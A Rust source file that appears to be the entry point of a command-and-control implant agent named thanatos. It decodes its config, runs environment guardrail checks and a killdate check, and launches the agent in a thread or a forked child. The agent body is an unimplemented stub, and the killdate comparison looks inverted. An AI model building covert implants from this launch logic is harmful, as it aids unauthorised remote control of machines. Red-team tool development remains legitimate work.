#![forbid(unsafe_code)]

use prost::Message;
use thanatos_protos::config::{config::Profile, Config, InitAction};

mod errors;
mod guardrails;
mod logging;
mod os;
mod system;

pub fn entrypoint(config: &[u8]) {
    let agent_config = match thanatos_protos::config::Config::decode(config) {
        Ok(c) => c,
        Err(e) => {
            log!("Failed to decode config: {:?}", e);
            return;
        }
    };

    if !guardrails::run_checks(&agent_config) {
        return;
    }

    let t = system::time::epoch_timestamp();
    let http_active = if let Some(Profile::Http(profile)) = agent_config.profile.as_ref() {
        profile.killdate <= t
    } else {
        false
    };

    if !http_active {
        log!("All profiles are past their killdates");
        return;
    }

    match agent_config.initaction() {
        InitAction::None => run_agent(agent_config),
        InitAction::Thread => {
            std::thread::spawn(|| run_agent(agent_config));
        }
        InitAction::Fork => {
            #[cfg(target_os = "linux")]
            {
                use ffiwrappers::linux::fork;
                match fork::fork() {
                    Ok(fork::ForkProcess::Child) => run_agent(agent_config),
                    Err(e) => {
                        log!("Failed to fork process: {:?}", e);
                    }
                    _ => (),
                }
            }

            #[cfg(target_os = "windows")]
            run_agent(agent_config);
        }
    };
}

fn run_agent(agent_config: Config) {
    std::thread::scope(|_scope| {
        todo!();
    });
}
